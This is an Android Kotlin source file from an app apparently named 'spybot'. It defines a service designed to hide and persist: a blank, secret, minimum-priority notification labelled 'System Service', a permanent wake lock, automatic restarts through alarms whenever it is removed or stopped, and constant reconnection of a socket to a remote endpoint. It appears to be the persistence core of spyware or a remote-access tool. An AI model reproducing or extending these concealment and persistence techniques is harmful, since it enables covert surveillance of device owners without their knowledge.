package com.spybot.app

import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.widget.RemoteViews
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.spybot.app.Receiver.RestartReceiver
import com.spybot.app.Utils.AppSocket
import com.spybot.app.Utils.AppTools

class MainService : Service() {

    companion object {
        private const val TAG = "MainService"
        private const val CHANNEL_ID = "system_service"
        private const val NOTIFICATION_ID = 1001

        const val ACTION_START = "com.spybot.app.MainService.START"
        const val ACTION_RESTART = "com.spybot.app.MainService.RESTART"
        const val ACTION_STOP = "com.spybot.app.MainService.STOP"
        const val ALARM_ACTION = "com.spybot.app.MainService.ALARM"

        private const val RESTART_REQUEST_CODE = 1002
        private const val ALARM_INTERVAL = 30000L
        private const val HEARTBEAT_INTERVAL = 10000L

        @Volatile
        private var isServiceRunning = false

        fun isRunning(): Boolean = isServiceRunning

        fun start(context: Context) {
            try {
                val intent = Intent(context, MainService::class.java).apply { action = ACTION_START }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ContextCompat.startForegroundService(context, intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                scheduleRestartAlarm(context, 1000)
            }
        }

        fun scheduleRestartAlarm(context: Context, delayMs: Long) {
            try {
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val intent = Intent(context, RestartReceiver::class.java).apply { action = ALARM_ACTION }
                val pendingIntent = PendingIntent.getBroadcast(
                    context, RESTART_REQUEST_CODE, intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )
                val triggerTime = SystemClock.elapsedRealtime() + delayMs
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent
                    )
                } else {
                    alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent)
                }
            } catch (e: Exception) {}
        }
    }

    private var appSocket: AppSocket? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private val handler = Handler(Looper.getMainLooper())

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                Intent.ACTION_SCREEN_ON, Intent.ACTION_USER_PRESENT -> reconnectIfNeeded()
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        isServiceRunning = true
        createNotificationChannel()
        startAsForeground()
        acquireWakeLock()
        registerReceivers()
        startHeartbeat()
        schedulePeriodicAlarms()
        initializeConnection()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> { stopSelf(); return START_NOT_STICKY }
            ACTION_RESTART -> reconnectIfNeeded()
        }
        ensureForeground()
        initializeConnection()
        schedulePeriodicAlarms()
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            val restartIntent = Intent(applicationContext, MainService::class.java).apply { action = ACTION_RESTART }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent)
            } else {
                startService(restartIntent)
            }
        } catch (e: Exception) {}
        scheduleRestartAlarm(applicationContext, 100)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        isServiceRunning = false
        handler.removeCallbacksAndMessages(null)
        releaseWakeLock()
        unregisterReceivers()
        scheduleRestartAlarm(applicationContext, 500)
        super.onDestroy()
    }

    private fun initializeConnection() {
        try {
            val appData = AppTools.getAppData()
            if (appSocket == null) {
                appSocket = AppSocket(this)
            }
            appSocket?.connect()
        } catch (e: Exception) {
            handler.postDelayed({ initializeConnection() }, 5000)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Required for app functionality"
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun startAsForeground() {
        val notification = createNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(
                    NOTIFICATION_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {}
    }

    private fun ensureForeground() {
        try {
            val notification = createNotification()
            val manager = getSystemService(NotificationManager::class.java)
            manager.notify(NOTIFICATION_ID, notification)
        } catch (e: Exception) {}
    }

    @SuppressLint("NewApi")
    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setOngoing(true)
            .setSmallIcon(R.drawable.mpt)
            .setContentTitle(" ")
            .setContentText("")
            .setBadgeIconType(NotificationCompat.BADGE_ICON_NONE)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setCustomBigContentView(RemoteViews(packageName, R.layout.notification))
            .build()
    }

    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spybot:MainService").apply { acquire() }
        } catch (e: Exception) {}
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let { if (it.isHeld) it.release() }
            wakeLock = null
        } catch (e: Exception) {}
    }

    private fun registerReceivers() {
        try {
            val screenFilter = IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_SCREEN_OFF)
                addAction(Intent.ACTION_USER_PRESENT)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(screenReceiver, screenFilter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(screenReceiver, screenFilter)
            }
        } catch (e: Exception) {}

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                networkCallback = object : ConnectivityManager.NetworkCallback() {
                    override fun onAvailable(network: Network) { reconnectIfNeeded() }
                }
                connectivityManager.registerDefaultNetworkCallback(networkCallback!!)
            } catch (e: Exception) {}
        }
    }

    private fun unregisterReceivers() {
        try { unregisterReceiver(screenReceiver) } catch (e: Exception) {}
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                networkCallback?.let {
                    val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                    connectivityManager.unregisterNetworkCallback(it)
                }
            } catch (e: Exception) {}
        }
    }

    private fun startHeartbeat() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (isServiceRunning) {
                    performHeartbeat()
                    handler.postDelayed(this, HEARTBEAT_INTERVAL)
                }
            }
        }, HEARTBEAT_INTERVAL)
    }

    private fun performHeartbeat() {
        ensureForeground()
        if (appSocket == null || appSocket?.isConnected() != true) {
            if (isNetworkAvailable()) {
                initializeConnection()
            }
        }
    }

    private fun schedulePeriodicAlarms() {
        try {
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(this, RestartReceiver::class.java).apply { action = ALARM_ACTION }
            val pendingIntent = PendingIntent.getBroadcast(
                this, NOTIFICATION_ID, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            alarmManager.setRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + ALARM_INTERVAL,
                ALARM_INTERVAL, pendingIntent
            )
        } catch (e: Exception) {}
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        } else {
            @Suppress("DEPRECATION")
            connectivityManager.activeNetworkInfo?.isConnected == true
        }
    }

    private fun reconnectIfNeeded() {
        if (isNetworkAvailable()) {
            if (appSocket == null || appSocket?.isConnected() != true) {
                initializeConnection()
            }
        }
    }
}
